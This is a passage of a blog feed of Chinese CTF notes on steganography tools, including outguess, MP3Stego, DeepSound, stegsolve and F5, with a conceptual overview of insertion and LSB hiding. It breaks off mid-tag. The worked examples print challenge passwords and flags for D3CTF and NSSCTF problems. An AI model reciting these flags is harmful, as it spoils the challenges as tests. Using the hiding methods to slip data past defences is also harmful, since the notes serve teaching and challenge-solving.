    <content type="html"><![CDATA[<h1 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h1><p><a href="https://blog.csdn.net/qq_45784859/article/details/105057281">https://blog.csdn.net/qq_45784859&#x2F;article&#x2F;details&#x2F;105057281</a></p><p>outguess下载安装t</p><p>kail 终端命令输入git clone <a href="https://github.com/crorvick/outguess">https://github.com/crorvick/outguess</a>，安装包下载完成到文件夹。打开文件夹，右键空白处选终端打开，输入命令.&#x2F;configure &amp;&amp; make &amp;&amp; make install进行安装。</p><p>使用outguess</p><p>输入outguess -help即可获得相关命令。</p><p>加密：</p><p>outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</p><p>加密之后，demo.jpg会覆盖out.jpg，hidden.txt的内容是要隐藏的东西。</p><p>解密：</p><p>outguess -k “my secret key” -r out.jpg hidden.txt</p><p>解密之后，紧密内容放在hidden.txt中</p><p>outguess -k “Be4uti7ulSun5e7” -r sunset.wav hidden.txt</p><blockquote><p>更新: 2025-05-09 16:29:25<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/viytnou4rn0kxere">https://www.yuque.com/chaye-apqbl/vsc85q/viytnou4rn0kxere</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/mp3stego%EF%BC%88%E4%B8%80%E5%AE%9A%E8%A6%81%E6%94%BE%E5%9C%A8MP3stgeo%E6%96%87%E4%BB%B6%E4%B8%8B%E9%9D%A2%EF%BC%89/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/mp3stego%EF%BC%88%E4%B8%80%E5%AE%9A%E8%A6%81%E6%94%BE%E5%9C%A8MP3stgeo%E6%96%87%E4%BB%B6%E4%B8%8B%E9%9D%A2%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="mp3stego（一定要放在MP3stgeo文件下面）"><a href="#mp3stego（一定要放在MP3stgeo文件下面）" class="headerlink" title="mp3stego（一定要放在MP3stgeo文件下面）"></a>mp3stego（一定要放在MP3stgeo文件下面）</h1><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><a href="https://blog.csdn.net/qq_53079406/article/details/124677358?spm=1001.2014.3001.5501">【音频隐写】S-TOOLS具体使用步骤（准备+载体+分析+hidden+加密+对比）、附下载链接-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_53079406/article/details/124680295">【音频隐写提取】MP3Stego下载、命令、使用方法-CSDN博客</a></p><pre><code class="hljs">     -X        提取隐藏数据      -P &lt;text&gt;        用密码用于嵌入      -A        编写AIFF输出PCM声音文件      -s &lt;sb&gt;        仅在此SB（仅调试）      inputBS        编码音频的输入位      outPCM        输出PCM声音文件（DFLT输入+.AIF | .pcm）      outhidden        输出隐藏的文本文件（dflt inputbs+.txt）</code></pre><h1 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h1><h3 id="将要提取到文件下"><a href="#将要提取到文件下" class="headerlink" title="将要提取到文件下"></a><strong><font style="color:rgb(79, 79, 79);background-color:rgb(162, 224, 67);">将要提取到文件下</font></strong></h3><p>要进入MP3</p><p><font style="color:rgb(79, 79, 79);">放到和Decode.exe同一目录中</font></p><p> <img src="/./img/yQZEQfIZtwFHMIvf/1729130938027-9f06e325-51df-43d0-931d-edbb66b4d09f-337189.png" alt="1729130938027-9f06e325-51df-43d0-931d-edbb66b4d09f.png"></p><p>进入终端</p><p><img src="/./img/yQZEQfIZtwFHMIvf/1729130986738-4dfe6493-a8ed-4e83-88b0-8c52448207d8-703459.png" alt="1729130986738-4dfe6493-a8ed-4e83-88b0-8c52448207d8.png"></p><h3 id="第四步：输入提取命令"><a href="#第四步：输入提取命令" class="headerlink" title="第四步：输入提取命令"></a><strong><font style="color:rgb(79, 79, 79);background-color:rgb(162, 224, 67);">第四步：输入提取命令</font></strong></h3><p><font style="color:rgb(79, 79, 79);">.\Decode.exe -X -P 1111</font><font style="color:rgb(79, 79, 79);"> </font><font style="color:rgb(78, 161, 219) !important;">hidden</font><font style="color:rgb(79, 79, 79);">.WAV</font></p><p><font style="color:rgb(79, 79, 79);">-X是提取隐藏文件</font></p><p><font style="color:rgb(79, 79, 79);">-P是密码</font></p><p><font style="color:rgb(79, 79, 79);">111为文件隐藏时的密码</font></p><p><font style="color:rgb(79, 79, 79);">hidden.WAV是要提取的文件</font></p><p><img src="/./img/yQZEQfIZtwFHMIvf/1729131003483-1fa7de3d-d8fb-4fa0-89f1-8ac525516e72-846246.png" alt="1729131003483-1fa7de3d-d8fb-4fa0-89f1-8ac525516e72.png"></p><h3 id="第五步：分析结果"><a href="#第五步：分析结果" class="headerlink" title="第五步：分析结果"></a><strong><font style="color:rgb(79, 79, 79);background-color:rgb(162, 224, 67);">第五步：分析结果</font></strong></h3><p><font style="color:rgb(79, 79, 79);">Will attempt to extract hidden information（将尝试提取隐藏的信息）</font></p><p><font style="color:rgb(79, 79, 79);">输出为hidden.wav.txt（命名：使用原音频名）</font></p><p><img src="/./img/yQZEQfIZtwFHMIvf/1729131036381-273c2990-76ef-49b2-a283-0d7de6210947-748086.png" alt="1729131036381-273c2990-76ef-49b2-a283-0d7de6210947.png"></p><blockquote><p>更新: 2024-10-17 11:42:26<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/rgfua7h2feat74ro">https://www.yuque.com/chaye-apqbl/vsc85q/rgfua7h2feat74ro</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/index/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/index/</url>
    
    <content type="html"><![CDATA[<h1 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h1><blockquote><p>更新: 2024-10-17 10:01:00<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/vv72xd326dsxctc0">https://www.yuque.com/chaye-apqbl/vsc85q/vv72xd326dsxctc0</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/DeepSound/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/DeepSound/</url>
    
    <content type="html"><![CDATA[<h1 id="DeepSound"><a href="#DeepSound" class="headerlink" title="DeepSound"></a>DeepSound</h1><p>下载</p><p><a href="https://github.com/Jpinsoft/DeepSound/releases/tag/v2.2.2404.04">https://github.com/Jpinsoft/DeepSound/releases/tag/v2.2.2404.04</a></p><p>使用教程</p><p><a href="https://blog.csdn.net/Hardworking666/article/details/123363550">https://blog.csdn.net/Hardworking666/article/details/123363550</a></p><h2 id="wav文件头实例分析"><a href="#wav文件头实例分析" class="headerlink" title="wav文件头实例分析"></a><a href="https://so.csdn.net/so/search?q=wav&spm=1001.2101.3001.7020"><font style="color:rgb(79, 79, 79);">wav</font></a><font style="color:rgb(79, 79, 79);">文件头实例分析</font></h2><p><img src="/./img/GHcNymVQw99dxZQ1/1731828618800-e1e8a75a-a3f0-498e-b67a-f7a042fb7be2-025571.png" alt="1731828618800-e1e8a75a-a3f0-498e-b67a-f7a042fb7be2.png"></p><p><strong>（1）52 49 46 46 ，这个是Ascii字符“RIFF”，这部分是固定格式，表明这是一个WAVE文件头。</strong></p><hr><p><strong>（2）22 60 28 00，这个是我这个WAV文件的数据大小，这个大小包括除了前面4个字节的所有字节，也就等于文件总字节数减去8。16进制的“22 60 28 00”对应是十进制的“2646050”。</strong></p><hr><p><strong>（3）57 41 56 45 66 6D 74 20，也是Ascii字符“WAVEfmt”，这部分是固定格式。</strong></p><p><strong>wav文件格式</strong></p><p><a href="https://www.cnblogs.com/ranson7zop/p/7657874.html">https://www.cnblogs.com/ranson7zop/p/7657874.html</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><h3 id="修改wav头"><a href="#修改wav头" class="headerlink" title="修改wav头"></a><font style="color:rgb(79, 79, 79);">修改wav头</font></h3><p><font style="color:rgb(77, 77, 77);">附件是wav，对比正常的wav发现前十六个字节被修改，第一行的内容猜测是密码： CUY1nw31lai<br></font><font style="color:rgb(77, 77, 77);">改回来：</font></p><p><img src="/./img/GHcNymVQw99dxZQ1/1731828697708-93fe175c-38f6-4b6a-8613-67db41c25de3-254465.png" alt="1731828697708-93fe175c-38f6-4b6a-8613-67db41c25de3.png"></p><p><img src="/./img/GHcNymVQw99dxZQ1/1731828704716-b6b69649-c006-4c17-8632-2445da42dc98-509279.png" alt="1731828704716-b6b69649-c006-4c17-8632-2445da42dc98.png"></p><h3 id="DeepSound隐写"><a href="#DeepSound隐写" class="headerlink" title="DeepSound隐写"></a><font style="color:rgb(79, 79, 79);">DeepSound</font><a href="https://so.csdn.net/so/search?q=%E9%9A%90%E5%86%99&spm=1001.2101.3001.7020"><font style="color:rgb(79, 79, 79);">隐写</font></a></h3><p><font style="color:rgb(77, 77, 77);">DeepSound是一款可以</font><strong><font style="color:rgb(77, 77, 77);">将文件添加到歌曲中的软件</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">可把非常私密的文件隐藏在歌曲里</font></strong><font style="color:rgb(77, 77, 77);">。</font></p><p><font style="color:rgb(77, 77, 77);">输入前面的密码。得到flag.png<br></font><img src="/./img/GHcNymVQw99dxZQ1/1731828717219-6b0b5705-d303-4990-81fd-6a62ef3780dc-693653.png" alt="1731828717219-6b0b5705-d303-4990-81fd-6a62ef3780dc.png"></p><h3 id="file识别文件-PS处理"><a href="#file识别文件-PS处理" class="headerlink" title="file识别文件+PS处理"></a><font style="color:rgb(79, 79, 79);">file识别文件+PS处理</font></h3><p><font style="color:rgb(77, 77, 77);">file识别文件发现flag.png是TIFF文件，PS打开TIFF文件</font></p><p><img src="/./img/GHcNymVQw99dxZQ1/1731828749490-934ab63a-8aea-4f72-87f4-0ab80bf8b179-688838.png" alt="1731828749490-934ab63a-8aea-4f72-87f4-0ab80bf8b179.png"></p><p><img src="/./img/GHcNymVQw99dxZQ1/1731828769187-5123b95c-ba76-4263-bb70-2ae5de7b3af4-041958.png" alt="1731828769187-5123b95c-ba76-4263-bb70-2ae5de7b3af4.png"></p><p><font style="color:rgb(77, 77, 77);">然后 图像-&gt;调整-&gt;亮度&#x2F;对比度 直接将亮度，对比度拉到最低，扫描二维码即可得到flag：D3CTF{M1r@9e_T@nK_1s_Om0sh1roiii1111!!!Isn’t_1t?}</font></p><p><img src="/./img/GHcNymVQw99dxZQ1/1731828784406-140befb6-f24c-4e35-8434-803d1a2fe78b-931174.png" alt="1731828784406-140befb6-f24c-4e35-8434-803d1a2fe78b.png"></p><blockquote><p>更新: 2024-11-17 15:34:06<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ym041s974vf375qt">https://www.yuque.com/chaye-apqbl/vsc85q/ym041s974vf375qt</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/audacity/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/audacity/</url>
    
    <content type="html"><![CDATA[<h1 id="audacity"><a href="#audacity" class="headerlink" title="audacity"></a>audacity</h1><p><a href="https://blog.csdn.net/vanarrow/article/details/105667244">CTF 音频隐写 大总结_ctf wav隐写-CSDN博客</a></p><blockquote><p>更新: 2024-10-17 10:13:41<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ht0b8qcwm32zlyy6">https://www.yuque.com/chaye-apqbl/vsc85q/ht0b8qcwm32zlyy6</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/stegsolve%E6%88%96%E8%80%85%E7%94%A8kali%E7%9A%84zsteg/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/stegsolve%E6%88%96%E8%80%85%E7%94%A8kali%E7%9A%84zsteg/</url>
    
    <content type="html"><![CDATA[<h1 id="stegsolve或者用kali的zsteg"><a href="#stegsolve或者用kali的zsteg" class="headerlink" title="stegsolve或者用kali的zsteg"></a>stegsolve或者用kali的zsteg</h1><p><a href="https://blog.csdn.net/m0_63100066/article/details/129783861?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-129783861-blog-136940462.235%5Ev43%5Epc_blog_bottom_relevance_base1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">stegsolve使用方法-CSDN博客</a></p><blockquote><p>更新: 2024-10-17 11:56:29<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/by4t1shhm0opzr6n">https://www.yuque.com/chaye-apqbl/vsc85q/by4t1shhm0opzr6n</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/index/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/index/</url>
    
    <content type="html"><![CDATA[<h1 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h1><blockquote><p>更新: 2025-05-13 16:53:37<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/zplgae6pne0qgvny">https://www.yuque.com/chaye-apqbl/vsc85q/zplgae6pne0qgvny</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/gif%E6%96%87%E4%BB%B6/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/gif%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="gif文件"><a href="#gif文件" class="headerlink" title="gif文件"></a>gif文件</h1><h1 id="可以用stegslove-Frame-Browser"><a href="#可以用stegslove-Frame-Browser" class="headerlink" title="可以用stegslove Frame Browser"></a>可以用stegslove Frame Browser</h1><h1 id="也可以使用在线工具识别然后打包静态文件：将GIF动图拆分成多张静态图片，支持单张或打包下载全部，直接把文件拖入到页面即可！-UU在线工具-uutool-cn"><a href="#也可以使用在线工具识别然后打包静态文件：将GIF动图拆分成多张静态图片，支持单张或打包下载全部，直接把文件拖入到页面即可！-UU在线工具-uutool-cn" class="headerlink" title="也可以使用在线工具识别然后打包静态文件：将GIF动图拆分成多张静态图片，支持单张或打包下载全部，直接把文件拖入到页面即可！ - UU在线工具 (uutool.cn)"></a>也可以使用在线工具识别然后打包静态文件：<a href="https://uutool.cn/gif2img/">将GIF动图拆分成多张静态图片，支持单张或打包下载全部，直接把文件拖入到页面即可！ - UU在线工具 (uutool.cn)</a></h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、gif好像有点大"><a href="#1、gif好像有点大" class="headerlink" title="1、gif好像有点大"></a>1、gif好像有点大</h2><p>gif的题目，分析帧，先用stegsolve打开GIF，</p><p><img src="/./img/49277317_C4TMDPaSALVkmOvq/1722323060059-46743b60-3e31-48a9-8023-ce2225a0933f-841843.jpeg" alt="1722323060059-46743b60-3e31-48a9-8023-ce2225a0933f.jpeg"></p><p>在分析里面，选择帧浏览器，然后狂点，大概在五百多帧那</p><p>扫描二维码即可得到flag</p><p><img src="/./img/49277317_C4TMDPaSALVkmOvq/1722323076808-d714ad7d-9ca6-40d5-838b-bd861dc11004-306418.jpeg" alt="1722323076808-d714ad7d-9ca6-40d5-838b-bd861dc11004.jpeg"></p><p>NSSCTF{The_G1F_ls_T00_b1g}</p><blockquote><p>更新: 2024-07-30 15:07:13<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/mf7gvaduqx5qmwst">https://www.yuque.com/chaye-apqbl/vsc85q/mf7gvaduqx5qmwst</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/f5%E9%9A%90%E5%86%99/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/f5%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="f5隐写"><a href="#f5隐写" class="headerlink" title="f5隐写"></a>f5隐写</h1><p><strong><font style="color:rgb(77, 77, 77);">有一种隐写算法叫 F5</font></strong></p><p><strong><font style="color:rgb(77, 77, 77);">F5算法解密是需要密码的，密码哪里来？图片名啊</font></strong></p><p><strong><font style="color:rgb(77, 77, 77);">F5除了是键盘的一个键位还是一种隐写算法</font></strong></p><p><strong><font style="color:rgb(77, 77, 77);">github工具源码：</font></strong><a href="https://github.com/matthewgao/F5-steganography"><strong><font style="color:rgb(77, 77, 77);">https://github.com/matthewgao/F5-steganography</font></strong></a><strong><font style="color:rgb(77, 77, 77);"><br></font><strong><strong><font style="color:rgb(77, 77, 77);">命令</font></strong></strong><font style="color:rgb(134, 202, 94);">：java Extract 你的图片的绝对路径\123456.jpg -p 密码（例如123456）</font></strong></p><p><strong><font style="color:rgb(134, 202, 94);">windows</font></strong></p><p><a href="https://github.com/matthewgao/F5-steganography">GitHub - matthewgao&#x2F;F5-steganography: F5 steganography</a></p><p><strong><font style="color:rgb(134, 202, 94);">linux下方法为</font></strong></p><p><strong><font style="color:rgb(134, 202, 94);">git clone </font></strong><a href="https://github.com/matthewgao/F5-steganography"><strong>https://github.com/matthewgao/F5-steganography</strong></a></p><p><strong><font style="color:rgb(134, 202, 94);">从这个github网站下载F5隐写的解密算法</font></strong></p><p><strong><font style="color:#DF2A3F;">cd F5-steganography</font></strong></p><p><strong><font style="color:rgb(134, 202, 94);">java Extract 123456.jpg图片的绝对地址 -p 123456</font></strong></p><p><strong><font style="color:rgb(134, 202, 94);">在f5-steganography文件夹里面调用Extract.java解密</font></strong></p><p><strong><font style="color:rgb(134, 202, 94);">然后cat output.txt就可以看到flag.</font></strong></p><p><img src="/./img/49277317_cObxBhWik_DZNIW6/1726638369324-c9e60cd2-a062-44b5-9b07-f472bba4ec33-058206.png" alt="1726638369324-c9e60cd2-a062-44b5-9b07-f472bba4ec33.png"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>看属性里面</p><p><img src="/./img/49277317_cObxBhWik_DZNIW6/1726639123153-f607bbcb-9179-467c-808b-ba98ace133b8-755057.png" alt="1726639123153-f607bbcb-9179-467c-808b-ba98ace133b8.png"></p><p><img src="/./img/49277317_cObxBhWik_DZNIW6/1726639151147-1d0389d3-0803-422f-a348-88fe0c9aaf2c-265767.png" alt="1726639151147-1d0389d3-0803-422f-a348-88fe0c9aaf2c.png"></p><p>密码就是这个（当时真的无语住了）no_password</p><p><img src="/./img/49277317_cObxBhWik_DZNIW6/1726978557250-970f8d4b-9d35-47cf-9d84-70c6a1d1507b-000577.png" alt="1726978557250-970f8d4b-9d35-47cf-9d84-70c6a1d1507b.png"></p><p><img src="/./img/49277317_cObxBhWik_DZNIW6/1726978655453-0bf723a7-13ec-46e9-b35d-866b7111591a-210360.png" alt="1726978655453-0bf723a7-13ec-46e9-b35d-866b7111591a.png"></p><blockquote><p>更新: 2024-09-22 12:19:38<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/do1veyw84qa0kwu9">https://www.yuque.com/chaye-apqbl/vsc85q/do1veyw84qa0kwu9</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/exiftool/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/exiftool/</url>
    
    <content type="html"><![CDATA[<h1 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h1><p><a href="https://www.rmnof.com/article/exiftool-introduction/">ExifTool完全入门指南 (rmnof.com)</a></p><p> .\exiftool.exe 1.jpg</p><blockquote><p>更新: 2024-10-17 12:15:32<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/fb41i6c9cdf2n421">https://www.yuque.com/chaye-apqbl/vsc85q/fb41i6c9cdf2n421</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9A%90%E5%86%99%E6%A6%82%E5%BF%B5/"/>
    <url>/2026/01/19/MISC/%E9%9A%90%E5%86%99/%E9%9A%90%E5%86%99%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="隐写概念"><a href="#隐写概念" class="headerlink" title="隐写概念"></a>隐写概念</h1><h1 id="一、前言："><a href="#一、前言：" class="headerlink" title="一、前言："></a>一、前言：</h1><p>最近 5 年恶意软件中利用的隐写技术已有所增多。 攻击者可以利用这些技术成功将恶意软件渗透过防火墙、 Web应用过滤软件、 入侵防御系统 以及其他没有被侦察的网络层的防御系统，基本方法：将数据隐藏到载体文件中</p><p> 隐写后原始信息被掩盖或者不可见。 在数字隐写术中， 人们通常会使用某种程序将消息或文件嵌入到一个载体文件中， 然后把这个载体文件直接传给接收者或者发布到网站上供接收者下载。 接收者获取载体文件后， 再用同样的程序把隐藏的消息或文件恢复。 有些隐藏程序会使用密码来保护隐藏消息， 还有些程序除密码外， 还会通过加密来保护隐藏数据。</p><h1 id="二、数字信息的隐藏，-主要分两大类"><a href="#二、数字信息的隐藏，-主要分两大类" class="headerlink" title="二、数字信息的隐藏， 主要分两大类"></a>二、数字信息的隐藏， 主要分两大类</h1><h2 id="2-1、插入："><a href="#2-1、插入：" class="headerlink" title="2.1、插入："></a>2.1、插入：</h2><p>通过插入方法隐藏消息会插入一些额外内容， 除了被隐藏的消息外， 还有文件制作工具的标识， 这入方法隐藏消息会插入一些额外内容， 除了被隐藏的消息外， 还有文件制作工具的标识， 这个标识记录了隐写程序处理隐藏栽荷的地点。 这种方法通常会利用文件格式中的空白部分。</p><h2 id="2-2、替换："><a href="#2-2、替换：" class="headerlink" title="2.2、替换："></a>2.2、替换：</h2><p>通过替换方法隐藏消息会改变消息中的宇节或者交换宇节顺序。 它不会在栽体文 件中增加任何新的内容， 而是通过修改宇节或者调整宇节位置让人们看不到或者听不到文件内容。 例如，LSB (Least Significant Bit, 最低有效位</p><h1 id="三、插入方法"><a href="#三、插入方法" class="headerlink" title="三、插入方法"></a>三、插入方法</h1><h2 id="3-1、插入和隐写的本质区别："><a href="#3-1、插入和隐写的本质区别：" class="headerlink" title="3.1、插入和隐写的本质区别："></a>3.1、插入和隐写的本质区别：</h2><p>在隐写术中， 很重要的一点就是从原始数据或者原始承载文件的角度考虑问题。 使用插入方法， 不会改变原始数据， 而是为文件增加了额外数据。 使用修改方法则恰恰相反： 未增加额外数据， 却改变了原始数据。 对于整个文件来说， 这两个方法都修改了文件；但对千数据而言， 插入方法增加了数据， 而修改方法改变了原始数据。 通过后面内容的学习， 你会很快发现， 不少隐写程序同时应用了这两种方法。</p><h2 id="3-2、追加插入法"><a href="#3-2、追加插入法" class="headerlink" title="3.2、追加插入法"></a>3.2、追加插入法</h2><p> （软件有：JPEGX  <a href="http://www.nerdlogic.com)/">www.nerdlogic.com）</a></p><p>在文件末尾附加数据应该是数字隐写术里最常用、最简单的方法。</p><p>可以在很多类型的文件后追加数据，却不会导致文件破坏。WinHex是一个16进制的编辑软件，可以通过它查看文件的原始格式，它可以显示文件的所有数据，包括换行符和可执行代码。而且所有的数据都是以两位十六进制格式显示的，中间部分显示的是以十六进制表示的文件数据，左列显示的是计数器和偏移址，用于跟踪不同内容在文件中的位置。右列是以ASCII码格式表示的文件数据</p><p>（由于ASCII码的局限性，并不是所有的十六进制数据都有与之对应的ASCII码）</p><p><img src="/./img/49277317_v2oRw4TQWt61T06K/1715250364779-1a093d50-8bab-4a52-beac-7541012ffaab-288094.png" alt="1715250364779-1a093d50-8bab-4a52-beac-7541012ffaab.png"></p><p>正常的JPEG文件末尾有一个标为”OxFF OxD9” 的文件结束符(End oflmage, EOI)。</p><p>使用编辑软件打开并写入语句。用WinHex打开这个修改过的文件就可以看到附加在文件末尾的数据，附加的数据是紧跟在文件结束符OxFFOxD9后面的。</p><p>当浏览文件时，EOI之上的数据隐藏通常会被忽略，但是它通常会表明存在带有隐藏数据的修改过的文件。</p><p><img src="/./img/49277317_v2oRw4TQWt61T06K/1715250375889-895b0828-2f43-40fb-89f2-2811434f8f48-308291.png" alt="1715250375889-895b0828-2f43-40fb-89f2-2811434f8f48.png"></p><h2 id="3-3、前置插入法"><a href="#3-3、前置插入法" class="headerlink" title="3.3、前置插入法"></a>3.3、前置插入法</h2><p> 任何可以插入批注内容的文件都可能被插入数据，毫不影响视觉效果。</p><p>例如，HTML文件和JPEG文件都很容易用来嵌入数据。</p><p>以JPEG文件为例，我们最多可以在其中 插入65533个字节的批注信息，而这些内容在浏览图像的时候都是看不到的。JPEG文件被文件标识符分成不同的区域，每个标识符都以OxFF开头。这些标识符标识着文件的布局、格式和其他详细信息，具体如表3.1所示。</p><p><img src="/./img/49277317_v2oRw4TQWt61T06K/1715250405068-9eebc45c-ef86-40ae-aa96-897b0891c77d-067740.png" alt="1715250405068-9eebc45c-ef86-40ae-aa96-897b0891c77d.png"></p><h2 id="3-4、JPHS使用方法："><a href="#3-4、JPHS使用方法：" class="headerlink" title="3.4、JPHS使用方法："></a>3.4、JPHS使用方法：</h2><h3 id="3-4-1、-原理："><a href="#3-4-1、-原理：" class="headerlink" title="3.4.1、 原理："></a>3.4.1、 原理：</h3><p>在JPEG文件首部，有很多数据区域可以用来隐藏信息。使用JPHideandSeek修改后的JPEG文件与原始文件的对比图。请注意JPEG应用程序标识符OxFF  OxEO和帧起始标识符OxFFOxCO这两个标识符之间插人和修改的数据。</p><p>JPHideandSeek:(windows界面化下载）</p><p>Download for Free JPHS for Windows 0.5 (scanwith.com)</p><p><a href="https://www.scanwith.com/JPHS_for_Windows_download.htm#google_vignette">https://www.scanwith.com/JPHS_for_Windows_download.htm#google_vignette</a></p><p>你可以毫不费力地在 JPEG 文件的批注区域 隐藏大量的数据， 尽管在公共区域 最多可以插入65 533个字节的批注信息， 但必须至少插入两个字节。 批注区是数据隐藏的绝好位置，因为在 APPO 标识符的作用下， 解码器（图像浏览器）无法识别的原数据都被忽略掉了， 浏览图像时自然就看不到了。</p><h3 id="3-4-2、使用方法："><a href="#3-4-2、使用方法：" class="headerlink" title="3.4.2、使用方法："></a>3.4.2、使用方法：</h3><p>jphide seek（JPHS） 使用方法,检测提示，附下载地址</p><p><a href="https://blog.csdn.net/qq_53079406/article/details/123608345?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_53079406&#x2F;article&#x2F;details&#x2F;123608345?spm&#x3D;1001.2014.3001.5501</a></p><p>（在上面我这个博客里有详细的使用讲解）</p><p><img src="/./img/49277317_v2oRw4TQWt61T06K/1715250574869-c254801d-37d1-48e4-b585-a3d55f1c3f89-948587.png" alt="1715250574869-c254801d-37d1-48e4-b585-a3d55f1c3f89.png"></p><p><img src="/./img/49277317_v2oRw4TQWt61T06K/1715250610117-733372bd-eb74-4da9-9da3-4d32da85da75-202970.png" alt="1715250610117-733372bd-eb74-4da9-9da3-4d32da85da75.png"></p><h1 id="四、-修改方法"><a href="#四、-修改方法" class="headerlink" title="四、 修改方法"></a>四、 修改方法</h1><h2 id="4-1、原理："><a href="#4-1、原理：" class="headerlink" title="4.1、原理："></a>4.1、原理：</h2><p>最常用的隐写修改方法就是修改文件中 个或者多个字节的最低有效位 基本上就是把0改成1或者把1改成0。 这样修改后生成的图像就有了渲染效果， 把这些比特位重组还原后才可以看到原始的隐藏消息， 而人们仅靠视觉或听觉是不可能发现 这些改动的。</p><h2 id="4-2、LSB修改方法"><a href="#4-2、LSB修改方法" class="headerlink" title="4.2、LSB修改方法"></a>4.2、LSB修改方法</h2><p>最低有效位(LSB)修改法利用的是24位调色板。 调色板中有红、 绿、 蓝三原色， 这一点和电视机分量视频的视频显示原理类似， 分量视频就是使用红、 绿、 蓝三根线把视频信号传输到电视机上的。</p><p>在一个图像的24位调色板中， 每8位表示一个原色， 也就是说红、 绿、 蓝分别有256个色调</p><p>由于人眼只能识别红、 绿、 蓝3种颜色，因此需要通过混合这 3种颜色来指定24位图像的每个像素的颜色。查看图像内容的时候，你会看到3个十六进制数字(3元组），它们分别代表红色、绿色和蓝色。</p><p><img src="/./img/49277317_v2oRw4TQWt61T06K/1715250636633-f680ee56-5dc9-41b1-812d-649f51343afe-410070.png" 